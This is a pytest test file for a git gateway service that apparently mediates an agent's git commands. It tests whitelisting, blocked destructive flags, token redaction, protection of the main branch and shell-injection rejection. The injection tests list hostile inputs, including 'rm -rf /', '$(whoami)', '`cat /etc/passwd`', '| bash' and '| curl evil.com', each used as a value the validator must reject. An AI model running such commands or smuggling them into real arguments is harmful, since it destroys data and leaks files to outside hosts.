"""Tests for git_gateway service — whitelist, blacklist, redaction, validation."""

from __future__ import annotations

import pytest

from app.modules.git_gateway.service import (
    ALLOWED_OPERATIONS,
    DEFAULT_GIT_AUTHOR_EMAIL,
    DEFAULT_GIT_AUTHOR_NAME,
    GitOperationForbidden,
    redact_output,
    validate_operation,
)


class TestWhitelist:
    def test_all_allowed_operations_recognized(self) -> None:
        expected = {
            "status",
            "diff",
            "add",
            "commit",
            "push",
            "pull",
            "fetch",
            "log",
            "branch",
            "checkout",
            "merge",
            "rebase",
        }
        assert expected == ALLOWED_OPERATIONS

    # sorted() 保证参数化顺序确定:ALLOWED_OPERATIONS 是 frozenset,其迭代顺序受
    # PYTHONHASHSEED 影响,各进程不同 → pytest-xdist 多 worker 收集顺序不一致而报错。
    @pytest.mark.parametrize("op", sorted(ALLOWED_OPERATIONS))
    def test_allowed_operations_pass(self, op: str) -> None:
        validate_operation(op, [])  # should not raise


class TestBlacklist:
    def test_disallowed_operation_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="not allowed"):
            validate_operation("stash", [])

    def test_push_force_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="Blocked"):
            validate_operation("push", ["--force"])

    def test_reset_hard_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden):
            validate_operation("reset", ["--hard", "HEAD~1"])

    def test_clean_fd_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden):
            validate_operation("clean", ["-fd"])

    def test_reflog_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden):
            validate_operation("reflog", [])

    def test_exec_flag_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="Blocked"):
            validate_operation("log", ["--exec=rm -rf /"])

    def test_unknown_operation_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden):
            validate_operation("clone", [])


class TestRedaction:
    def test_github_pat_redacted(self) -> None:
        out = "Pushing to https://ghp_AbCdEf1234567890abcdefghijklmn@github.com/repo"
        assert "ghp_AbCdEf" not in redact_output(out)
        assert "***REDACTED***" in redact_output(out)

    def test_bearer_token_redacted(self) -> None:
        out = "Authorization: Bearer ghp_AbCdEf1234567890abcdefghijklmn"
        result = redact_output(out)
        assert "ghp_AbCdEf" not in result

    def test_url_token_redacted(self) -> None:
        out = "remote: https://user:ghp_AbCdEf1234567890abcdefghijklmn@github.com/repo"
        result = redact_output(out)
        assert "ghp_AbCdEf" not in result

    def test_github_pat_long_redacted(self) -> None:
        out = "token: github_pat_AAAA1234567890abcdefghijklmnopqrstuv"
        result = redact_output(out)
        assert "github_pat_" not in result

    def test_no_false_positives(self) -> None:
        out = "On branch main\nnothing to commit, working tree clean"
        assert redact_output(out) == out

    def test_truncation(self) -> None:
        long_out = "x" * 100_000
        result = redact_output(long_out)
        assert len(result) < 70_000
        assert "[truncated]" in result

    def test_empty_string(self) -> None:
        assert redact_output("") == ""


class TestShellInjection:
    def test_command_substitution_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("commit", ["-m", "$(whoami)"])

    def test_semicolon_rm_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format; rm -rf /"])

    def test_backtick_injection_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("commit", ["-m", "`cat /etc/passwd`"])

    def test_pipe_malicious_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format | bash"])

    def test_pipe_curl_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="injection"):
            validate_operation("log", ["--format | curl evil.com"])

    def test_normal_pipe_not_rejected(self) -> None:
        # "grep" is not in the malicious list, and no other pattern matches
        validate_operation("log", ["--format", "oneline"])  # no pipe at all


class TestDefaultBranchPushProtection:
    def test_push_main_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="protected branch"):
            validate_operation("push", ["origin", "main"])

    def test_push_master_rejected(self) -> None:
        with pytest.raises(GitOperationForbidden, match="protected branch"):
            validate_operation("push", ["origin", "master"])

    def test_push_feature_branch_allowed(self) -> None:
        validate_operation("push", ["origin", "feature-branch"])  # should not raise

    def test_push_main_as_part_of_name_allowed(self) -> None:
        # "maintain" should NOT be blocked — exact match only
        validate_operation("push", ["origin", "maintain"])

    def test_push_no_args_allowed(self) -> None:
        # bare push with no branch args is fine
        validate_operation("push", [])

    def test_push_origin_only_allowed(self) -> None:
        validate_operation("push", ["origin"])


class TestGitIdentityDefaults:
    def test_default_name(self) -> None:
        assert DEFAULT_GIT_AUTHOR_NAME == "SillyHub Agent"

    def test_default_email(self) -> None:
        assert DEFAULT_GIT_AUTHOR_EMAIL == "agent@sillyhub.local"
